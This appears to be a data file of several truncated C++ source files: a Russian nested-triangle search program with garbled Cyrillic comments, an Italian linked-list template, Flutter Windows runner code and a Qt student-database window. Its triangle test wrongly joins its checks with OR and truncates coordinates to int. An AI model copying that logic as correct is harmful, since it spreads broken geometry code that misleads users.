    "// \u00cd\u00e0\u00e9\u00f2\u00e8 \u00f2\u00f0\u00e8 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0 \u00f1 \u00e2\u00e5\u00f0\u00f8\u00e8\u00ed\u00e0\u00ec\u00e8 \u00e2 \u00e7\u00e0\u00e4\u00e0\u00ed\u00ed\u00ee\u00ec \u00ec\u00ed\u00ee\u00e6\u00e5\u00f1\u00f2\u00e2\u00e5 \u00e8\u00e7 n \u00f2\u00ee\u00f7\u00e5\u00ea \u00ed\u00e0\n// \u00ef\u00eb\u00ee\u00f1\u00ea\u00ee\u00f1\u00f2\u00e8 \u00f2\u00e0\u00ea, \u00f7\u00f2\u00ee\u00e1\u00fb \u00e2\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00eb\u00e5\u00e6\u00e0\u00eb \u00f1\u00f2\u00f0\u00ee\u00e3\u00ee \u00e2\u00ed\u00f3\u00f2\u00f0\u00e8 \u00ef\u00e5\u00f0\u00e2\u00ee\u00e3\u00ee, \u00e0\n// \u00f2\u00f0\u00e5\u00f2\u00e8\u00e9 \u00e2\u00ed\u00f3\u00f2\u00f0\u00e8 \u00e2\u00f2\u00ee\u00f0\u00ee\u00e3\u00ee.\n\n#include <iostream>\n#include <Windows.h>\n#include <fstream>\n#include<array>\n\nusing namespace std;\n\n//\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00f2\u00ee\u00f7\u00ea\u00e0\nstruct Point\n{\n\tdouble x, y;\n};\n\n//\u00e2\u00e2\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 \u00f1 \u00ea\u00eb\u00e0\u00e2\u00e8\u00e0\u00f2\u00f3\u00f0\u00fb\npair<Point*, int> Rkey()\n{\n\tint n;\n\tcout << endl << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f2\u00ee\u00f7\u00e5\u00ea \u00e2 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e5:  \";\n\tcin >> n;\n\tPoint* mas = new Point[n];\n\tcout << endl;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 x \u00e8 y \u00f2\u00ee\u00f7\u00ea\u00e8 [\"<<i+1<<\"]: \";\n\t\tcin >> mas[i].x;\n\t\tcin >> mas[i].y;\n\t}\n\treturn make_pair(mas, n);\n}\n\n//\u00e2\u00e2\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 \u00f1 \u00f4\u00e0\u00e9\u00eb\u00e0\npair<Point*, int> Rfile()\n{\n\tifstream fin(\"input.txt\");\n\tint N, k;\n\tint A[1000];\n\tPoint* mas;\n\tif (!fin.good())\n\t{\n\t\tcout << \"\u00d4\u00e0\u00e9\u00eb input.txt \u00ed\u00e5 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed!\" << endl;\n\t}\n\telse\n\t{\n\t\tk = 0;\n\t\twhile (fin >> N)\n\t\t{\n\t\t\tA[k++] = N;\n\t\t}\n\t\tmas = new Point[k / 2];\n\t\tfor (int i = 0; i < k; i += 2)\n\t\t{\n\t\t\tmas[i / 2].x = A[i];\n\t\t\tmas[i / 2].y = A[i + 1];\n\t\t}\n\t\tfin.close();\n\t\treturn make_pair(mas, k / 2);\n\t}\n\tfin.close();\n\treturn make_pair(mas, 0);\n}\n\n//\u00e2\u00fb\u00e2\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 \u00f2\u00ee\u00f7\u00e5\u00ea\nvoid writeP(Point* mas,int n)\n{\n\tcout << \"\u00c2\u00f5\u00ee\u00e4\u00ed\u00ee\u00e9 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2 \u00f2\u00ee\u00f7\u00e5\u00ea:\" << endl;\n\tfor (int i = 0; i <n; i++)\n\t{\n\t\tcout << \"[\" << mas[i].x << \"; \" << mas[i].y << \"]    \";\n\t}\n\tcout << endl;\n}\n//\u00ff\u00e2\u00eb\u00ff\u00fe\u00f2\u00f1\u00ff \u00eb\u00e8 \u00f2\u00f0\u00e8 \u00f2\u00ee\u00f7\u00ea\u00e8 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00ee\u00ec\nbool trian(Point a, Point b, Point c)\n{\n\tdouble lab, lac, lbc;\n\tlab = sqrt(pow((a.x - b.x), 2) + pow((a.y - b.y), 2));\n\tlac = sqrt(pow((a.x - c.x), 2) + pow((a.y - c.y), 2));\n\tlbc = sqrt(pow((b.x - c.x), 2) + pow((b.y - c.y), 2));\n\tif (lab + lac > lbc)\n\t\treturn true;\n\telse\n\t\tif (lab + lbc > lac)\n\t\t\treturn true;\n\t\telse\n\t\t\tif (lac + lbc > lab)\n\t\t\t\treturn true;\n\t\t\telse\n\t\t\t\treturn false;\n}\n\nbool IsPIn_(Point a, Point b, Point c, Point p)\n{\n\tint af = (a.x - p.x) * (b.y - a.y) - (b.x - a.x) * (a.y - p.y);\n\tint bf = (b.x - p.x) * (c.y - b.y) - (c.x - b.x) * (b.y - p.y);\n\tint cf = (c.x - p.x) * (a.y - c.y) - (a.x - c.x) * (c.y - p.y);\n\n\tif ((af > 0 && bf > 0 && cf > 0) || (af < 0 && bf < 0 && cf < 0))\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\n//\u00ef\u00ee\u00e8\u00f1\u00ea \u00f2\u00f0\u00e5\u00f5 \u00e2\u00eb\u00ee\u00e6\u00e5\u00ed\u00ed\u00fb\u00f5 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00ee\u00e2\nvoid serh(Point* mas, int n)\n{\n\tint trian1[3];\n\tint trian2[3];\n\tint trian3[3];\n\tbool ress = false;\n\t//\u00ef\u00e5\u00f0\u00e2\u00fb\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\n\tfor (int i1 = 0; i1 < n - 2; i1++)\n\t{\n\t\tfor (int j1 = i1+1; j1 < n - 1; j1++)\n\t\t{\n\t\t\tfor (int k1 = j1+1; k1 < n; k1++)\n\t\t\t{\n\t\t\t\tif (trian(mas[i1], mas[j1], mas[k1]))\n\t\t\t\t{\n\t\t\t\t\t//\u00cf\u00e5\u00f0\u00e2\u00fb \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\n\t\t\t\t\ttrian1[0] = i1; trian1[1] = j1; trian1[2] = k1;\n\t\t\t\t\t//\u00ef\u00ee\u00e8\u00f1\u00ea \u00e2\u00f2\u00ee\u00f0\u00ee\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0\n\t\t\t\t\tfor (int i2 = 0; i2 < n-2 ; i2++)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (IsPIn_(mas[trian1[0]], mas[trian1[1]], mas[trian1[2]], mas[i2])\n\t\t\t\t\t\t\t&& (i2 !=i1 ) && i2!=j1 &&i2!=k1)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tfor (int j2 = i2 + 1; j2 < n - 1; j2++)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian1[0]], mas[trian1[1]], mas[trian1[2]], mas[j2])\n\t\t\t\t\t\t\t\t\t&& (j2 != i1) && j2 != j1 && j2 != k1)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tfor (int k2 = j2 + 1; k2 < n; k2++)\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian1[0]], mas[trian1[1]], mas[trian1[2]], mas[k2])\n\t\t\t\t\t\t\t\t\t\t\t&& (k2 != i1) && k2 != j1 && k2 != k1)\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tif (trian(mas[i2], mas[j2], mas[k2]))\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t//\u00c2\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\n\t\t\t\t\t\t\t\t\t\t\t\ttrian2[0] = i2; trian2[1] = j2; trian2[2] = k2;\n\t\t\t\t\t\t\t\t\t\t\t\t//\u00cf\u00ee\u00e8\u00f1\u00ea \u00f2\u00f0\u00e5\u00f2\u00fc\u00e5\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0\n\t\t\t\t\t\t\t\t\t\t\t\tfor (int i3 = 0; i3 < n - 2; i3++)\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian2[0]], mas[trian2[1]], mas[trian2[2]], mas[i3])\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& (i3 != i2) && i3 != j2 && i3 != k2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor (int j3 = i3 + 1; j3 < n - 1; j3++)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian2[0]], mas[trian2[1]], mas[trian2[2]], mas[j3])\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& (j3 != i2) && j3 != j2 && j3 != k2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor (int k3 = j3 + 1; k3 < n; k3++)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian2[0]], mas[trian2[1]], mas[trian2[2]], mas[k3])\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& (k3 != i2) && k3 != j2 && k3 != k2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (trian(mas[i3], mas[j3], mas[k3]))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tress = true;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//\u00c2\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttrian3[0] = i3; trian3[1] = j3; trian3[2] = k3;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"===============================================\" << endl;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"\u00c2\u00e5\u00f0\u00f8\u00e8\u00ed\u00fb \u00ef\u00e5\u00f0\u00e2\u00ee\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0 \u00e8\u00ec\u00e5\u00fe\u00f2 \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00fb:\" << endl;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"[{\" << mas[trian1[0]].x << \" \" << mas[trian1[0]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian1[1]].x << \" \" << mas[trian1[1]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian1[2]].x << \" \" << mas[trian1[2]].y << \"}]\" << endl;\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"\u00c2\u00e5\u00f0\u00f8\u00e8\u00ed\u00fb \u00e2\u00f2\u00ee\u00f0\u00ee\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0 \u00e8\u00ec\u00e5\u00fe\u00f2 \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00fb:\" << endl;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"[{\" << mas[trian2[0]].x << \" \" << mas[trian2[0]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian2[1]].x << \" \" << mas[trian2[1]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian2[2]].x << \" \" << mas[trian2[2]].y << \"}]\" << endl;\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"\u00c2\u00e5\u00f0\u00f8\u00e8\u00ed\u00fb \u00f2\u00f0\u00e5\u00f2\u00fc\u00e5\u00e3\u00ee ",
    "#include <iostream>\n#include \"list.hpp\"\nnamespace lasd {\n\n// Node Methods\n/* ************************************************************************** */\n\n// Constructors\n\n// Data copy constructor\ntemplate <typename Data> List<Data>::Node::Node(const Data &d) : val{d} {}\n\n// Data move constructor\ntemplate <typename Data> List<Data>::Node::Node(Data &&d) noexcept {\n  std::swap(d, val);\n}\n\n// Copy constructor\ntemplate <typename Data>\nList<Data>::Node::Node(const Node &other) : val(other.val) {}\n\n// Move constructor\ntemplate <typename Data> List<Data>::Node::Node(Node &&other) noexcept {\n  std::swap(other.val, val);\n  std::swap(other.next, next);\n}\n\n// Destructor\ntemplate <typename Data> List<Data>::Node::~Node() { delete next; }\n\n// Operators\n\n// Comparison operators\ntemplate <typename Data>\ninline bool List<Data>::Node::operator==(const Node &other) const noexcept {\n  return val == other.val;\n}\n\ntemplate <typename Data>\ninline bool List<Data>::Node::operator!=(const Node &other) const noexcept {\n  return !((*this) == other);\n}\n\n/* ************************************************************************** */\n\n// List Methods\n/* ************************************************************************** */\n\n// Constructors\n\n// Copy constructor from Different DataStructures\ntemplate <typename Data>\nList<Data>::List(const TraversableContainer<Data> &con) {\n  con.Traverse([this](const Data &currData) { InsertAtBack(currData); });\n}\n\n// Move constructor from Different DataStructures\ntemplate <typename Data> List<Data>::List(MappableContainer<Data> &&con) {\n  con.Map([this](Data &currData) { InsertAtBack(std::move(currData)); });\n}\n\n// Copy constructor\ntemplate <typename Data> List<Data>::List(const List<Data> &l) {\n  if (!(size = l.size))\n    return;\n\n  head = new Node(*(l.head));\n  tail = head;\n\n  Node *temp = l.head->next;\n\n  while (temp) {\n    tail->next = new Node(*temp);\n    tail = tail->next;\n    temp = temp->next;\n  }\n}\n\n// Move constructor\ntemplate <typename Data> List<Data>::List(List &&l) {\n  std::swap(size, l.size);\n  std::swap(head, l.head);\n  std::swap(tail, l.tail);\n}\n\n// Destructor\ntemplate <typename Data> List<Data>::~List() {\n  delete head;\n  head = tail = nullptr;\n  size = 0;\n}\n\n// Operators\n\n// Copy assignment\ntemplate <typename Data>\nList<Data> &List<Data>::operator=(const List<Data> &l) {\n\n  if (!l.size) {\n    Clear();\n    return *this;\n  }\n\n  if (!size) {\n    List<Data> temp{l};\n    std::swap(temp, *this);\n    return *this;\n  }\n\n  Node *wl{l.head};\n  tail = head;\n\n  tail->val = wl->val;\n\n  while (tail->next && wl->next) {\n    tail = tail->next;\n    wl = wl->next;\n\n    tail->val = wl->val;\n  }\n\n  if (tail->next) {\n    delete tail->next;\n    tail->next = nullptr;\n  } else\n    for (wl = wl->next; wl; wl = wl->next) {\n      InsertAtBack(wl->val);\n    }\n  size = l.size;\n  return *this;\n}\n\n// Move assignment\ntemplate <typename Data>\nList<Data> &List<Data>::operator=(List<Data> &&l) noexcept {\n  std::swap(size, l.size);\n  std::swap(head, l.head);\n  std::swap(tail, l.tail);\n  return *this;\n}\n\n// Comparison operators\ntemplate <typename Data>\ninline bool List<Data>::operator==(const List<Data> &l) const noexcept {\n  if (size != l.size)\n    return false;\n\n  Node *temp = head, *temp2 = l.head;\n\n  while (temp != nullptr) {\n    if (temp->val != temp2->val)\n      return false;\n    temp = temp->next;\n    temp2 = temp2->next;\n  }\n  return true;\n}\n\ntemplate <typename Data>\ninline bool List<Data>::operator!=(const List<Data> &l) const noexcept {\n  return !(*this == l);\n}\n\n// Specific Operators\n\ntemplate <typename Data>\ninline const Data &List<Data>::operator[](unsigned long ind) const {\n  if (ind >= size)\n    throw std::out_of_range(\"La lista non ha abbastanza elementi\");\n  Node *temp{head};\n \n \n  for (unsigned int i{0}; i < ind; ++i, temp = temp->next);\n      return temp->val;\n}\ntemplate <typename Data>\ninline Data &List<Data>::operator[](unsigned long ind) {\n  if (ind >= size)\n    throw std::out_of_range(\"La lista non ha abbastanza elementi\");\n\n  Node *temp{head};\n  for (unsigned int i{0}; i < ind; ++i, temp = temp->next);\n     return temp->val;\n}\n\n// Specific methods\n\ntemplate <typename Data> void List<Data>::InsertAtFront(const Data &d) {\n  Node *temp = new Node(d);\n  temp->next = head;\n  head = temp;\n  if (tail == nullptr)\n    tail = head;\n  ++size;\n}\n\ntemplate <typename Data> void List<Data>::InsertAtFront(Data &&d) {\n  Node *temp = new Node(std::move(d));\n  temp->next = head;\n  head = temp;\n  if (tail == nullptr)\n    tail = head;\n  ++size;\n}\n\ntemplate <typename Data> void List<Data>::RemoveFromFront() {\n  if (!size)\n    throw std::length_error(\"Non puoi rimuovere da una lista vuota...\");\n  Node *temp{head};\n  head == tail ? head = tail = nullptr : head = head->next;\n  temp->next = nullptr;\n  delete temp;\n  --size;\n}\n\ntemplate <typename Data> Data List<Data>::FrontNRemove() {\n  if (!size)\n    throw std::length_error(\"Non puoi rimuovere da una lista vuota...\");\n  Node *temp{head};\n  head == tail ? head = t",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"food_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <QFileInfo>\n#include <QMessageBox>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    ui->saveButton->hide();\n    ui->saveButton2->hide();\n    ui->cancelButton1->hide();\n    ui->cancelButton2->hide();\n\n    QSqlDatabase db = QSqlDatabase::addDatabase(\"QSQLITE\");\n    db.setDatabaseName(\"C://Users//User//Downloads//SSIS-2-main//SSIS-2-main//m//mainwindow.db\");\n\n    if (!db.open()) {\n        qDebug() << \"Error opening database:\" << db.lastError().text();\n        return;\n    }\n\n    QSqlQuery query(\"SELECT * FROM Students1\");\n\n    if (!query.exec()) {\n        qDebug() << \"Error executing query:\" << query.lastError().text();\n        db.close();\n        return;\n    }\n\n    ui->studentT->setRowCount(0);\n\n    ui->studentT->setColumnCount(7);\n    ui->studentT->setHorizontalHeaderLabels({\"Last Name\", \"First Name\", \"Middle Name\", \"ID Number\", \"Gender\", \"Year Level\", \"Course\"});\n\n    int row = 0;\n    while (query.next()) {\n        QString LastName = query.value(\"Surname\").toString();\n        QString FirstName = query.value(\"FirstName\").toString();\n        QString MiddleName = query.value(\"MiddleName\").toString();\n        QString IDNumber = query.value(\"IDNumber\").toString();\n        QString Gender = query.value(\"Gender\").toString();\n        QString YearLevel = query.value(\"YearLevel\").toString();\n        QString CourseCode = query.value(\"CourseCode\").toString();\n\n        ui->studentT->insertRow(row);\n\n        ui->studentT->setItem(row, 0, new QTableWidgetItem(LastName));\n        ui->studentT->setItem(row, 1, new QTableWidgetItem(FirstName));\n        ui->studentT->setItem(row, 2, new QTableWidgetItem(MiddleName));\n        ui->studentT->setItem(row, 3, new QTableWidgetItem(IDNumber));\n        ui->studentT->setItem(row, 4, new QTableWidgetItem(Gender));\n        ui->studentT->setItem(row, 5, new QTableWidgetItem(YearLevel));\n        ui->studentT->setItem(row, 6, new QTableWidgetItem(CourseCode));\n\n        row++;\n    }\n\n    //ui->tableWidget->resizeColumnsToContents();\n\n    query.finish();\n\n    QSqlQuery queryCourses(db);\n    queryCourses.prepare(\"SELECT * FROM Course2\");\n\n    if (!queryCourses.exec()) {\n        qDebug() << \"Error executing courses query:\" << queryCourses.lastError().text();\n        db.close();\n        return;\n    }\n\n    ui->courseT->setRowCount(0);\n    ui->courseT->setColumnCount(2);\n    ui->courseT->setHorizontalHeaderLabels({\"Course Code\", \"Course Name\"});\n\n    row = 0;\n    while (queryCourses.next()) {\n        QString courseCode = queryCourses.value(\"CourseCode\").toString();\n        QString courseName = queryCourses.value(\"CourseName\").toString();\n\n        ui->courseT->insertRow(row);\n\n        ui->courseT->setItem(row, 0, new QTableWidgetItem(courseCode));\n        ui->courseT->setItem(row, 1, new QTableWidgetItem(courseName));\n\n        row++;\n    }\n    ui->courseT->resizeColumnsToContents();\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\nvoid MainWindow::on_addButton1_clicked()\n{\n    // Retrieve values from input fields or widgets\n    QString lastName = ui->lastName->text();\n    QString firstName = ui->firstName->text();\n    QString middleName = ui->middleName->text();\n    QString idNumber = ui->ID->text();\n    QString gender = ui->gender->currentText();\n    QString yearLevel = ui->yrLvl->currentText();\n    QString courseCode = ui->course->text();\n\n    // Open the database connection\n    QSqlDatabase db = QSqlDatabase::database();\n    if (!db.isOpen()) {\n        qDebug() << \"Database not open!\";\n        return;\n    }\n\n    // Check if the ID number is in the correct format (xxxx-xxxx)\n    static QRegularExpression idRegex(\"\\\\d{4}-\\\\d{4}\"); // Regular expression to match the pattern xxxx-xxxx\n    if (!idRegex.match(idNumber).hasMatch()) {\n        // ID number is not in the correct format, display a message to the user\n        QMessageBox::warning(this, \"Invalid ID Number\", \"Please enter a valid ID number in the format xxxx-xxxx (e.g., 2022-0001).\");\n        return;\n    }\n\n    // Check if the course code is in the correct format (XXXX)\n    static QRegularExpression courseRegex(\"[A-Za-z]{4}\"); // Regular expression to match the pattern XXXX\n    if (!courseRegex.match(courseCode).hasMatch()) {\n        // Course code is not in the correct format, display a message to the user\n        QMessageBox::warning(this, \"Invalid Course Code\", \"Please enter a valid course code in the format XXXX (e.g., BSCS).\");\n        return;\n    }\n\n    // Check if the ID already exists in the database\n    QSqlQuery checkQuery(db);\n    checkQuery.prepare(\"SELECT IDNumber FROM Students1 WHERE IDNumber = :idNumber\");\n    checkQuery.bindValue(\":idNumber\", idNumber);\n    if (!checkQuery.exec()) {\n        qDebug() << \"Error executing query to check ID existence:\" << checkQuery.lastError().text();\n        return;\n    }\n\n    if (checkQuery.next()) {\n        // ID already exists, display a message to the user\n ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    